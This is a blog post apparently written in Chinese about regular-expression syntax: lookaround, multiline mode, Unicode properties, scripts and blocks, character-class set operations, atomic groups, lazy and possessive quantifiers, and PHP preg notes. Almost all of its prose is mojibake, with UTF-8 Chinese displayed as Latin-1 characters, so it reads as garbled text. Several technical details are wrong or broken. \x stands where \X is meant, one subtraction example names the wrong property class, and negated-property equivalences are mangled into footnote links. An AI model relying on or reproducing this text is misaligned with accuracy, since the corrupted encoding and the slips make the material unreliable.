åŒ¹é…</p><p>s/../../ åŒ¹é…å¹¶æ›¿æ¢</p><h2 id="ç¯è§†ç»“æ„"><a href="#ç¯è§†ç»“æ„" class="headerlink" title="ç¯è§†ç»“æ„"></a>ç¯è§†ç»“æ„</h2><h3 id="é¡ºåºç¯è§†"><a href="#é¡ºåºç¯è§†" class="headerlink" title="é¡ºåºç¯è§†"></a>é¡ºåºç¯è§†</h3><p>ç”¨(?=â€¦)æ¥è¡¨ç¤º</p><p>ä¾‹å¦‚</p><p>(?=\d),è¡¨ç¤ºå¦‚æœå½“å‰ä½ç½®å³è¾¹çš„å­—ç¬¦æ˜¯æ•°å­—åˆ™åŒ¹é…æˆåŠŸ</p><h3 id="é€†åºç¯è§†"><a href="#é€†åºç¯è§†" class="headerlink" title="é€†åºç¯è§†"></a>é€†åºç¯è§†</h3><p>ç”¨(?&lt;=â€¦.)è¡¨ç¤º</p><p>ä¾‹å¦‚(?&lt;=\d),è¡¨ç¤ºå¦‚æœå½“å‰ä½ç½®å·¦è¾¹æœ‰ä¸€ä½æ•°å­—åˆ™åŒ¹é…æˆåŠŸï¼ˆå³ç´§è·Ÿåœ¨æ•°å­—åé¢çš„ä½ç½®ï¼‰</p><p>å³é€†åºçš„æŸ¥çœ‹ï¼ˆä»å³å‘å·¦ï¼‰æ–‡æœ¬è¿›è¡ŒåŒ¹é…</p><h3 id="å¦å®šé¡ºåºç¯è§†"><a href="#å¦å®šé¡ºåºç¯è§†" class="headerlink" title="å¦å®šé¡ºåºç¯è§†"></a>å¦å®šé¡ºåºç¯è§†</h3><p>(?!â€¦â€¦) ä¸èƒ½åŒ¹é…å³ä¾§çš„æ–‡æœ¬ï¼Œå³ä½ç½®å³ä¾§ä¸èƒ½æ˜¯æŒ‡å®šçš„æ–‡æœ¬</p><h3 id="å¦å®šé€†åºç¯è§†"><a href="#å¦å®šé€†åºç¯è§†" class="headerlink" title="å¦å®šé€†åºç¯è§†"></a>å¦å®šé€†åºç¯è§†</h3><p>(?&lt;!â€¦)åŒä¸Šï¼Œåªæ˜¯æ”¹ä¸ºä¸èƒ½åŒ¹é…å·¦ä¾§çš„æ–‡æœ¬</p><h3 id="ç¯è§†ä¸ä¼šâ€œå ç”¨â€å­—ç¬¦"><a href="#ç¯è§†ä¸ä¼šâ€œå ç”¨â€å­—ç¬¦" class="headerlink" title="ç¯è§†ä¸ä¼šâ€œå ç”¨â€å­—ç¬¦"></a>ç¯è§†ä¸ä¼šâ€œå ç”¨â€å­—ç¬¦</h3><p>ç†è§£æ¯”è¾ƒå›°éš¾ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨å®ä¾‹</p><p>æ–‡æœ¬å¦‚ä¸‹</p><p>hello Miss Alice.</p><p>ä¸‹é¢ç”¨â€™â€™åŒ…è£¹åŒ¹é…çš„å†…å®¹æ¥è¡¨ç¤ºåŒ¹é…çš„å†…å®¹</p><p>Miss  åŒ¹é… hello â€˜Missâ€™ Alice</p><p>(?=Miss) åŒ¹é… hello â€˜â€™Miss Alice</p><p>å³Misså‰é¢çš„ä½ç½®ï¼Œå› ä¸ºç¬¦åˆå³è¾¹é‚»æ¥Missï¼ˆå³åœ¨Missçš„å‰é¢ï¼‰</p><p>(?=Miss)Mis åŒ¹é…hello â€˜Misâ€™s Alice</p><p>(?=Miss)Mis ç­‰ä»·äº Mis(?=s)</p><p>s/../../g å…¨å±€æ›¿æ¢</p><p>/m å¤šè¡ŒæŸ¥æ‰¾ï¼ˆå¯¼è‡´é¢˜ç›®å¡ä½çš„ç½ªé­ç¥¸é¦–~ï¼‰</p><p>m ä¸»è¦å½±å“ ^ã€$ã€‚</p><p>è‹¥ä¸æŒ‡å®š mï¼Œåˆ™ï¼š^ åªåœ¨å­—ç¬¦ä¸²çš„æœ€å¼€å¤´ï¼Œ$ åªåœ¨å­—ç¬¦ä¸²çš„æœ€ç»“å°¾ã€‚å³ï¼šåŒ¹é…æ•´ä¸ªä¸²çš„å¼€å§‹å’Œç»“æŸ</p><p>è‹¥æŒ‡å®š mï¼Œåˆ™ï¼š^ åœ¨å­—ç¬¦ä¸²æ¯ä¸€è¡Œçš„å¼€å¤´ï¼Œ$ åœ¨å­—ç¬¦ä¸²æ¯ä¸€è¡Œçš„ç»“å°¾ã€‚å³ï¼šåŒ¹é…æ¯ä¸€è¡Œçš„å¼€å§‹å’Œç»“æŸ</p><p>æ³¨æ„ï¼šåœ¨ä¸åŒæµæ´¾ä¸åŒè¯­è¨€ä¸­æ­£åˆ™è¡¨è¾¾å¼çš„æ ¼å¼å­˜åœ¨ç»†å¾®åŒºåˆ«</p><h2 id="è¿›åˆ¶è½¬ä¹‰"><a href="#è¿›åˆ¶è½¬ä¹‰" class="headerlink" title="è¿›åˆ¶è½¬ä¹‰"></a>è¿›åˆ¶è½¬ä¹‰</h2><h3 id="8è¿›åˆ¶è½¬ä¹‰"><a href="#8è¿›åˆ¶è½¬ä¹‰" class="headerlink" title="8è¿›åˆ¶è½¬ä¹‰"></a>8è¿›åˆ¶è½¬ä¹‰</h3><p>\num</p><p>è½¬ä¹‰ä¸ºASCIIä¸­æ•°å­—æ‰€ä»£è¡¨çš„å­—ç¬¦</p><h3 id="16è¿›åˆ¶-Unicodeè½¬ä¹‰"><a href="#16è¿›åˆ¶-Unicodeè½¬ä¹‰" class="headerlink" title="16è¿›åˆ¶/Unicodeè½¬ä¹‰"></a>16è¿›åˆ¶/Unicodeè½¬ä¹‰</h3><p>\xnum  \x(num) \unum \Unum</p><h3 id="æ§åˆ¶å­—ç¬¦"><a href="#æ§åˆ¶å­—ç¬¦" class="headerlink" title="æ§åˆ¶å­—ç¬¦"></a>æ§åˆ¶å­—ç¬¦</h3><p>\ccharç”¨äºåŒ¹é…å°äº32çš„æ§åˆ¶å­—ç¬¦ï¼ˆæœ‰äº›æ”¯æŒåŒ¹é…æ›´å¤§çš„å€¼ï¼‰</p><h3 id="x"><a href="#x" class="headerlink" title="\x"></a>\x</h3><p>åŒæ—¶\xåœ¨phpä¸­è¢«è§†ä¸º\P{M}|p{M}*çš„ç¼©ç•¥è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥çœ‹ä½œç‚¹å·çš„æ‰©å±•</p><p>\xä¸ç‚¹å·çš„åŒºåˆ«</p><p>1.\xèƒ½å¤ŸåŒ¹é…ç»“å°¾çš„ç»„åˆå­—ç¬¦ä¹‹å¤–</p><ol><li><p>\xèƒ½å¤ŸåŒ¹é…æ¢è¡Œç¬¦å’Œå…¶ä»–åœ¨Unicodeè¡Œç»ˆç»“ç¬¦</p></li><li><p>ç‚¹å·é€šé…æ¨¡å¼ä¸‹çš„ç‚¹å·æ— è®ºä»€ä¹ˆæƒ…å†µä¸‹éƒ½èƒ½åŒ¹é…ä»»ä½•å­—ç¬¦ï¼Œè€Œ\xä¸èƒ½åŒ¹é…ä»¥ç»„åˆå­—ç¬¦å¼€å¤´çš„å­—ç¬¦</p></li></ol><p>å…³äºåŸºæœ¬å­—ç¬¦å’Œç»„åˆå­—ç¬¦å¯ä»¥è‡ªè¡Œæœç´¢Unicodeä½“ç³»äº†è§£</p><h2 id="Unicodeçš„å­—ç¬¦æ€§è´¨"><a href="#Unicodeçš„å­—ç¬¦æ€§è´¨" class="headerlink" title="Unicodeçš„å­—ç¬¦æ€§è´¨"></a>Unicodeçš„å­—ç¬¦æ€§è´¨</h2><p>Unicodeä¸ä»…ä»…æ˜¯ä¸€å¥—å­—ç¬¦æ˜ å°„è§„åˆ™ï¼ŒåŒæ—¶Unicodeæ ‡å‡†è¿˜å®šä¹‰äº†æ¯ä¸€ä¸ªå­—ç¬¦çš„æ€§è´¨ï¼Œä¾‹å¦‚â€œè¿™ä¸ªå­—ç¬¦æ˜¯æ ‡è®°å­—ç¬¦ï¼ˆmarkï¼‰ï¼Œå®ƒå¿…é¡»å’Œå…¶ä»–å­—ç¬¦ä¸€èµ·ä½¿ç”¨â€ã€â€œ è¿™ä¸ªå­—ç¬¦æ˜¯å°å†™å­—ç¬¦â€</p><p>ç­‰ã€‚</p><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>ä¸åŒçš„æ­£åˆ™è¡¨è¾¾å¼ç³»ç»Ÿå¯¹äºè¿™äº›å±æ€§çš„æ”¯æŒä¹Ÿä¸åŒï¼Œä½†æ˜¯è®¸å¤šæ”¯æŒUnicodeçš„ç¨‹åºèƒ½å¤Ÿé€šè¿‡\p(quality)å¹¶æ”¯æŒå…¶ä¸­çš„ä¸€éƒ¨åˆ†</p><p>\Pxxåˆ™åŒ¹é…ä¸å…·æœ‰å¯¹åº”å±æ€§çš„å­—ç¬¦(ç­‰ä»·äº<sup><a href="#fn_\p{xx}" id="reffn_\p{xx}">\p{xx}</a></sup></p><p>åŸºæœ¬çš„Unicodeå±æ€§åˆ†ç±»å¦‚ä¸‹</p><p>\p{L}       \p{letter}å­—æ¯</p><p>\p{M}     \p{Mark}ä¸èƒ½å•ç‹¬å‡ºç°ï¼Œå¿…é¡»å’Œå…¶ä»–åŸºæœ¬å­—ç¬¦ä¸€èµ·å‡ºç°ï¼ˆä¾‹å¦‚ï¼šé‡éŸ³ç¬¦å·ï¼‰çš„å­—ç¬¦</p><p>\p{Z}      \p{Separator}ç”¨äºè¡¨ç¤ºåˆ†éš”ï¼Œä½†æœ¬èº«ä¸å¯è§çš„å­—ç¬¦</p><p>\p{S}      \p{Symbol}å„ç§å›¾å½¢ç¬¦å·å’Œå­—æ¯ç¬¦å·</p><p>\p{N}     \p{Number}ä»»ä½•æ•°å­—</p><p>\p{P}      \p{Punctuation}æ ‡ç‚¹å­—ç¬¦</p><p>\p{C}      \p{Other}åŒ¹é…å…¶ä»–ä»»ä½•å­—ç¬¦ï¼ˆå¾ˆå°‘ç”¨äºæ­£å¸¸å­—ç¬¦ï¼‰</p><p>æ³¨æ„ï¼šåœ¨éƒ¨åˆ†ç³»ç»Ÿä¸­å•å­—æ¯å±æ€§å¯èƒ½ä¸éœ€è¦èŠ±æ‹¬å·(ä¾‹å¦‚ï¼š\pLè€Œä¸æ˜¯\p{L}</p><p>åŒæ—¶æ¯ä¸ªå±æ€§åˆåŒ…å«è‹¥å¹²çš„å­å±æ€§ï¼Œå­å±æ€§è¿˜å¯ä»¥ä»¥æŸäº›å®ç°æ–¹å¼æ”¯æŒçš„ç‰¹æ®Šå½¢å¼å®ç°å¤åˆ</p><p>ä¾‹å¦‚ï¼š\p{L&amp;}ç­‰ä»·äº[\p{Lu}\p{Ll}\p{Lt}]</p><p>åŸºæœ¬å­å±æ€§å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/03/06/6Jg8HAtn7MkKhDo.png" alt="Untitled 2.png"></p><h3 id="å­—æ¯è¡¨"><a href="#å­—æ¯è¡¨" class="headerlink" title="å­—æ¯è¡¨"></a>å­—æ¯è¡¨</h3><p>éƒ¨åˆ†ç³»ç»Ÿèƒ½å¤ŸæŒ‰ç…§å­—æ¯è¡¨çš„åå­—ä»¥\p{â€¦}çš„æ ¼å¼è¿›è¡ŒåŒ¹é…ï¼Œä¾‹å¦‚\p{Hebrew}åŒ¹é…å¸Œä¼¯æ¥æ–‡ç‹¬æœ‰çš„å­—ç¬¦(ä¸åŒ…å«åœ¨å…¶ä»–ä¹¦å†™ç³»ç»Ÿä¸­ä¹Ÿå¸¸è§çš„å­—ç¬¦ä¾‹å¦‚é€—å·ï¼‰</p><p>éƒ¨åˆ†å­—æ¯è¡¨æ˜¯åŸºäºè¯­è¨€çš„å¦‚æ³°å›½è¯­ï¼Œåˆ‡ç½—åŸºè¯­ç­‰ï¼Œ</p><p>æœ‰çš„åˆ™åŒ…å«å¤šç§è¯­è¨€ï¼Œå¦‚æ‹‰ä¸æ–‡ï¼Œæœ‰äº›è¯­è¨€åŒ…ç”šè‡³åŒ…å«å¤šç§å­—æ¯è¡¨ï¼Œä¾‹å¦‚æ—¥è¯­çš„å­—ç¬¦å°±æœ‰éƒ¨åˆ†æ¥è‡ªæ±‰è¯­ã€æ‹‰ä¸è¯­ç­‰ã€‚å…·ä½“è¯·æŸ¥çœ‹å¯¹åº”çš„æ–‡æ¡£ã€‚</p><p>æ³¨æ„ï¼šå­—æ¯è¡¨åªåŒ…å«ç‹¬å±äºï¼ˆä¸¥æ ¼æ¥è¯´åº”è¯¥æ˜¯å‡ ä¹ç‹¬å±äºï¼Œä¾‹å¦‚ä¸Šæ–‡æåˆ°çš„æ—¥è¯­ï¼‰ï¼Œè€Œä¸æ˜¯ç‰¹å®šä¹¦å†™ç³»ç»Ÿçš„æ‰€æœ‰å­—ç¬¦ã€‚è€Œå¸¸è§çš„å­—ç¬¦åˆ™æ˜¯é€šå±äºå«IsCommonçš„å­—ç¬¦è¡¨ï¼Œä½¿ç”¨{IsCommon}æ¥è¿›è¡ŒåŒ¹é…ã€‚</p><p>æ‰©å±•ï¼šè¿˜æœ‰ä¸€ä¸ªä¼ªå­—ç¬¦è¡¨Inheritedå®ƒåŒ…æ‹¬ä»å…¶æ‰€å±çš„å­—ç¬¦è¡¨ä¸­çš„åŸºæœ¬å­—ç¬¦ç»§æ‰¿è€Œæ¥çš„ç»„åˆå­—ç¬¦ã€‚</p><h3 id="åŒºå—"><a href="#åŒºå—" class="headerlink" title="åŒºå—"></a>åŒºå—</h3><p>åŒºå—ç±»ä¼¼ä½†å°äºå­—æ¯è¡¨ï¼ˆæˆ–è€…è¯´æ˜¯ä½é…ç‰ˆçš„å­—æ¯è¡¨)ï¼ŒåŒºå—è¡¨ç¤ºUnicodeå­—ç¬¦æ˜ å°„è¡¨ä¸­ä¸€å®šèŒƒå›´å†…çš„ä»£ç ç‚¹ã€‚</p><p>ä¾‹å¦‚TibetanåŒºå—è¡¨ç¤ºçš„æ˜¯ä»U+0F00åˆ°U+0FFFçš„256ä¸ªä»£ç ç‚¹ã€‚å…¶ä¸­çš„å­—ç¬¦å¯ä»¥ç”¨\p{InTibetan}æ¥åŒ¹é….</p><p>ä¸ºä»€ä¹ˆæ˜¯ä½é…ç‰ˆçš„å­—æ¯è¡¨çš„åŸå› å¦‚ä¸‹ï¼š</p><p>1.åŒºå—å¯èƒ½åŒ…å«æ²¡æœ‰èµ‹å€¼çš„ä»£ç ç‚¹ï¼Œä¾‹å¦‚åœ¨TibetanåŒºå—ä¸­å°±æœ‰25%çš„ä»£ç ç‚¹æ²¡æœ‰åˆ†é…</p><p>2.å¹¶ä¸åƒå­—æ¯è¡¨é‚£æ ·ï¼Œæ‰€æœ‰çœ‹ä¸Šå»å’ŒåŒºå—å†…çš„å­—ç¬¦ç›¸å…³çš„å­—ç¬¦éƒ½åœ¨åŒºå—å†…çš„</p><p>3.åŒºå—å†…ä¹Ÿå¸¸å¸¸åŒ…å«å’ŒåŒºå—ä¸ç›¸å¹²çš„å­—ç¬¦ï¼Œä¾‹å¦‚äººæ°‘å¸ç¬¦å·ï¿¥åœ¨Latin_1_SupplementåŒºå—</p><p>4.åŒºå—æ˜¯ç›¸äº’äº¤å‰çš„ï¼Œå³æŸä¸ªå­—æ¯è¡¨çš„å­—ç¬¦å¯èƒ½åŒæ—¶è¢«åŒ…å«äºå¤šä¸ªåŒºå—ã€‚ä¾‹å¦‚å¸Œè…Šå­—æ¯åŒæ—¶å‡ºç°åœ¨Greekå’ŒGreek_Extended åŒºå—ä¸­</p><p>ä½†æ˜¯å¯¹äºåŒºå—çš„æ”¯æŒæ¯”å­—æ¯è¡¨æ›´åŠ æ™®é</p><p>æ¯”è¾ƒå¸¸è§çš„ç³»ç»Ÿæ”¯æŒå¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/03/06/QdeSxN1DKuTAwH6.png" alt="Untitled 3.png"></p><h2 id="å­—ç¬¦ç»„è¿ç®—"><a href="#å­—ç¬¦ç»„è¿ç®—" class="headerlink" title="å­—ç¬¦ç»„è¿ç®—"></a>å­—ç¬¦ç»„è¿ç®—</h2><h3 id="å‡å·ï¼ˆ-ï¼‰"><a href="#å‡å·ï¼ˆ-ï¼‰" class="headerlink" title="å‡å·ï¼ˆ-ï¼‰"></a>å‡å·ï¼ˆ-ï¼‰</h3><p>ç›´æ¥ç”¨å®ä¾‹è¯´æ˜</p><p>ä¾‹å¦‚</p><p>[[a-z]-[aeiou]]</p><p>åŒ¹é…çš„å­—ç¬¦å°±æ˜¯[a-z]èƒ½å¤ŸåŒ¹é…å­—ç¬¦çš„å‡å»[aeiou]èƒ½å¤ŸåŒ¹é…çš„å­—ç¬¦</p><p>ä¹Ÿå³é™¤äº†å…ƒéŸ³å­—æ¯ä»¥å¤–çš„å­—æ¯</p><p>[\p{P}-[\p{Ps}\p{Pe}] ]</p><p>åŒ¹é…\p{Ps}ä¸­é™¤äº†[\p{Ps}\p{Pe}]å¤–çš„å­—ç¬¦</p><p>å³åŒ¹é…é™¤äº†{å’Œ]ä¹‹ç±»æˆå¯¹çš„ç¬¦å·ä»¥å¤–çš„æ‰€æœ‰æ ‡ç‚¹ç¬¦å·ã€‚</p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>è¿™ä¸ªæˆ–ä¸Šæ–‡æœ‰æ‰€æåŠçš„â€˜|â€œä¸åŒè¿™é‡Œåƒä¸‡ä¸è¦å¼„æ··äº†ï¼Œåœ¨å­—ç¬¦ç»„ä¸­ORæ›´åƒæ˜¯ä¸€ç§ç®€è®°æ³•ï¼Œç”¨äºä»¥å­—ç¬¦ç»„çš„æ–¹å¼æ¥å…ˆå­—ç¬¦ç»„ä¸­æ·»åŠ å­—ç¬¦ï¼Œæ›´å¤šæ—¶å€™ç”¨äºæ’é™¤å‹å­—ç¬¦ç»„ä¸­ã€‚</p><p>ä¾‹å¦‚[abcxyz]ç­‰ä»·äº[ [abc] [xyz] ]ã€[ [abc]xyz]ç­‰ç­‰</p><h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>ANDå¯¹ä¸¤ä¸ªé›†åˆè¿›è¡Œä¸è¿ç®—</p><p>ä¾‹å¦‚[\p{InThai}&amp;&amp;\P{Cn}]</p><p>å¯¹\p{InThai}å’Œ\P{Cn}è¿›è¡Œäº¤è¿ç®—</p><p>æ³¨æ„ç¬¬äºŒä¸ªPæ˜¯å¤§å†™å³åŒ¹é…ä¸å…·æœ‰æ­¤å±æ€§çš„å­—ç¬¦</p><p>ä¹Ÿå³\P{Cn}ç­‰ä»·äº<sup><a href="#fn_\p{Cn}" id="reffn_\p{Cn}">\p{Cn}</a></sup></p><h3 id="é”šç‚¹åŠå…¶ä»–â€é›¶é•¿åº¦æ–­è¨€â€œ"><a href="#é”šç‚¹åŠå…¶ä»–â€é›¶é•¿åº¦æ–­è¨€â€œ" class="headerlink" title="é”šç‚¹åŠå…¶ä»–â€é›¶é•¿åº¦æ–­è¨€â€œ"></a>é”šç‚¹åŠå…¶ä»–â€é›¶é•¿åº¦æ–­è¨€â€œ</h3><p>é”šç‚¹åŠå…¶ä»–â€é›¶é•¿åº¦æ–­è¨€â€œå¹¶ä¸åŒ¹é…æ–‡æœ¬å†…å®¹ï¼Œè€Œæ˜¯å¯»æ‰¾æ–‡æœ¬ä¸­çš„ä½ç½®ã€‚</p><p>å…·ä½“å¯å‚è€ƒä¸‹è¡¨</p><p><img src="https://i.loli.net/2021/03/06/B9mAOtjSZw7RMce.png" alt="Untitled 4.png"></p><p>\G ç”¨äºåŒ¹é…èµ·å§‹ä½ç½®ï¼ˆæˆ–è€…æ˜¯ä¸Šä¸€æ¬¡åŒ¹é…çš„ç»“æŸä½ç½®ï¼‰</p><h2 id="æ¨¡å¼ä¿®é¥°ç¬¦ï¼ˆ-modifier"><a href="#æ¨¡å¼ä¿®é¥°ç¬¦ï¼ˆ-modifier" class="headerlink" title="æ¨¡å¼ä¿®é¥°ç¬¦ï¼ˆ?modifier)"></a>æ¨¡å¼ä¿®é¥°ç¬¦ï¼ˆ?modifier)</h2><p>å¸¸è§çš„æ¨¡å¼ä¿®é¥°ç¬¦å­—æ¯</p><p><img src="https://i.loli.net/2021/03/06/sV43tXduPIaOnMS.png" alt="Untitled 5.png"></p><p>ä½œç”¨èŒƒå›´</p><p>(?:(?i)very)å¯åŒ–ç®€ä¸ºï¼š</p><p>(?i:â€¦..)è¡¨ç¤ºåœ¨æ‹¬å·å†…æœ‰æ•ˆ</p><p>æ³¨æ„ï¼špythonæ”¯æŒç¬¬ä¸€ç§å³(?i)æ ¼å¼</p><p>ä½†æ˜¯ä¸æ”¯æŒ(?i:â€¦)æ ¼å¼</p><h2 id="æ³¨é‡Š-â€¦-å’Œ-â€¦"><a href="#æ³¨é‡Š-â€¦-å’Œ-â€¦" class="headerlink" title="æ³¨é‡Š(?#â€¦)å’Œ#â€¦"></a>æ³¨é‡Š(?#â€¦)å’Œ#â€¦</h2><p>å¾ˆå°‘ç”¨åˆ°å’Œè§åˆ°ï¼Œäº†è§£ä¸€ä¸‹å°±okäº†</p><h2 id="å›ºåŒ–åˆ†ç»„-ï¼ˆ-gt-â€¦"><a href="#å›ºåŒ–åˆ†ç»„-ï¼ˆ-gt-â€¦" class="headerlink" title="å›ºåŒ–åˆ†ç»„ ï¼ˆ?&gt;â€¦)"></a>å›ºåŒ–åˆ†ç»„ ï¼ˆ?&gt;â€¦)</h2><p>ä¸€æ—¦æ‹¬å·å†…çš„å­è¡¨è¾¾å¼åŒ¹é…ä¹‹åï¼ŒåŒ¹é…çš„å†…å®¹å°±å›ºå®šä¸‹æ¥æ— æ³•ä¿®æ”¹ï¼Œå¹¶ä¸”åœ¨æ¥ä¸‹æ¥çš„åŒ¹é…è¿‡ç¨‹ä¸­ä¸ä¼šå˜åŒ–ï¼Œé™¤éæ•´ä¸ªå›ºåŒ–åˆ†ç»„çš„æ‹¬å·éƒ½è¢«å¼ƒç”¨ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>æ–‡æœ¬ä¸ºhello!</p><p>.*!æ˜¯å¯ä»¥è¿›è¡ŒåŒ¹é…çš„</p><p>è€Œ(?&gt;.*)! æ˜¯æ— æ³•è¢«åŒ¹é…çš„</p><p>å› ä¸ºåœ¨å›ºåŒ–åˆ†ç»„ä¸­hello!å·²ç»è¢«.*æ‰€åŒ¹é…ä¸”æ— æ³•å†è¢«æ”¹å˜ï¼Œæ‰€ä»¥æ²¡æœ‰!æ¥åŒ¹é…åé¢çš„é‚£ä¸ª!äº†</p><h2 id="æ–‡å­—æ–‡æœ¬èŒƒå›´ï¼š-Qâ€¦-E"><a href="#æ–‡å­—æ–‡æœ¬èŒƒå›´ï¼š-Qâ€¦-E" class="headerlink" title="æ–‡å­—æ–‡æœ¬èŒƒå›´ï¼š\Qâ€¦\E"></a>æ–‡å­—æ–‡æœ¬èŒƒå›´ï¼š\Qâ€¦\E</h2><p>æ¶ˆé™¤\Eä»¥å¤–æ‰€æœ‰å…ƒå­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰ï¼Œå¦‚æœæ²¡æœ‰\Eåˆ™ä¸€ç›´ä½œç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼æœ«ç«¯ã€‚</p><p>å³åœ¨\Qåˆ°\Eçš„èŒƒå›´å†…ï¼Œæ‰€æœ‰å­—ç¬¦éƒ½è¢«å½“åšæ–‡æœ¬ï¼Œå…ƒå­—ç¬¦ä¹Ÿä¸éœ€è¦åœ¨å‰é¢åŠ ä¸Š\æ¥è¯´æ˜ç”¨ä½œå­—ç¬¦äº†</p><h2 id="å¿½ç•¥ä¼˜å…ˆé‡è¯ï¼š-num-num"><a href="#å¿½ç•¥ä¼˜å…ˆé‡è¯ï¼š-num-num" class="headerlink" title="å¿½ç•¥ä¼˜å…ˆé‡è¯ï¼š*? , +? , ?? , {num,num}?"></a>å¿½ç•¥ä¼˜å…ˆé‡è¯ï¼š*? , +? , ?? , {num,num}?</h2><p>å¦‚æœä¸ç¡®å®šæ˜¯å¦è¦åŒ¹é…ï¼Œå¿½ç•¥ä¼˜å…ˆé‡è¯ä¼šé€‰æ‹©â€ä¸åŒ¹é…â€çš„çŠ¶æ€ï¼Œå†å°è¯•è¡¨è¾¾å¼ä¸­ä¹‹åçš„å…ƒç´ ï¼Œå¦‚æœå°è¯•å¤±è´¥ï¼Œå†å›æº¯ï¼Œé€‰æ‹©ä¹‹å‰ä¿å­˜çš„â€åŒ¹é…â€çš„çŠ¶æ€ã€‚</p><p>å¯¹[\s\S]<em>æ¥è¯´</em>ï¼ŒæŠŠ<em>*æ”¹ä¸º</em>?å°±æ˜¯ä½¿ç”¨äº†å¿½ç•¥ä¼˜å…ˆé‡è¯ï¼Œ<em>?é™å®šçš„å…ƒç´ å‡ºç°æ¬¡æ•°èŒƒå›´ä¸</em>å®Œå…¨ä¸€æ ·ï¼Œéƒ½è¡¨ç¤ºâ€å¯èƒ½å‡ºç°ï¼Œä¹Ÿå¯èƒ½ä¸å‡ºç°ï¼Œå‡ºç°æ¬¡æ•°æ²¡æœ‰ä¸Šé™â€ã€‚åŒºåˆ«åœ¨äºï¼Œåœ¨å®é™…åŒ¹é…è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°[\s\S]èƒ½åŒ¹é…çš„å­—ç¬¦ï¼Œå…ˆå°è¯•â€å¿½ç•¥â€ï¼Œå¦‚æœåé¢çš„å…ƒç´ ä¸èƒ½åŒ¹é…ï¼Œå†å°è¯•â€åŒ¹é…â€ï¼Œå°±å¦‚åå­—ä¸€æ ·ä¼˜å…ˆå¿½ç•¥å‡ºç°çš„åŒ¹é…ç»“æœ</p><p>æ³¨æ„å¿½ç•¥ä¼˜å…ˆé‡è¯å’ŒåŒ¹é…ä¼˜å…ˆé‡è¯æœ¬èº«åœ¨åŒ¹é…æ¬¡æ•°ä¸Šæ˜¯æ²¡æœ‰åŒºåˆ«çš„ï¼Œä¾‹å¦‚<em>å’Œ</em>ï¼Ÿçš„åŒºé—´è¿˜éƒ½æ˜¯[0,âˆ]ï¼Œ<strong>åŒºåˆ«åœ¨äºï¼Œå¿½ç•¥ä¼˜å…ˆé‡è¯ä¼šä¼˜å…ˆé€‰æ‹©â€å¿½ç•¥â€ï¼Œè€ŒåŒ¹é…ä¼˜å…ˆé‡è¯ä¼šä¼˜å…ˆé€‰æ‹©â€åŒ¹é…â€ã€‚</strong></p><h2 id="å æœ‰ä¼˜å…ˆé‡è¯ï¼š-num-num"><a href="#å æœ‰ä¼˜å…ˆé‡è¯ï¼š-num-num" class="headerlink" title="å æœ‰ä¼˜å…ˆé‡è¯ï¼š*+ , ++ , ?+ , (num,num)+"></a>å æœ‰ä¼˜å…ˆé‡è¯ï¼š*+ , ++ , ?+ , (num,num)+</h2><p>å æœ‰ä¼˜å…ˆé‡è¯ç±»ä¼¼äºæ™®é€šçš„åŒ¹é…ä¼˜å…ˆé‡è¯ï¼Œä¸è¿‡ä»–ä»¬ä¸€æ—¦åŒ¹é…æŸäº›å†…å®¹å°±ä¸ä¼šâ€äº¤è¿˜â€œï¼Œç±»ä¼¼äºå›ºåŒ–åˆ†ç»„</p><h1 id="PHPç¯å¢ƒä¸‹çš„æ­£åˆ™"><a href="#PHPç¯å¢ƒä¸‹çš„æ­£åˆ™" class="headerlink" title="PHPç¯å¢ƒä¸‹çš„æ­£åˆ™"></a>PHPç¯å¢ƒä¸‹çš„æ­£åˆ™</h1><p>ä¸‹é¢ä¸»è¦è®¨è®ºçš„æ˜¯pregå¼•æ“ä¸‹æä¾›çš„å‡½æ•°</p><h2 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h2><p>pregå¼•æ“çš„ä¸€äº›è¯´æ˜</p><p>1.\båœ¨å­—ç¬¦ç»„å†…éƒ¨æ‰è¡¨ç¤ºé€€æ ¼ç¬¦ï¼Œåœ¨å…¶ä»–åœºåˆ\bè¡¨ç¤ºå•è¯åˆ†ç•Œç¬¦</p><p>\0åŒ¹é…ç©ºå­—èŠ‚</p><p>2.å•è¯åˆ†ç•Œç¬¦å’Œå­—ç¬¦ç®€è®°æ³•ï¼Œä¾‹å¦‚\w,\såªå¯¹ASCIIå­—ç¬¦èµ·ä½œç”¨ï¼ˆå³ä½¿æ˜¯åœ¨UTF-8æ¨¡å¼ä¸‹ï¼‰ï¼Œå¦‚æœè¦å¤„ç†Unicodeå­—ç¬¦ï¼Œå¯ä»¥ç”¨\pLä»£æ›¿\w,</p><p>\pNä»£æ›¿\d, \pZä»£æ›¿\s</p><p>3.åœ¨PHPé‡Œï¼ŒUnicodeçš„å­—æ¯è¡¨ä¸éœ€è¦ç±»ä¼¼äºâ€™Isâ€™æˆ–è€…â€™ Inâ€™è¿™æ 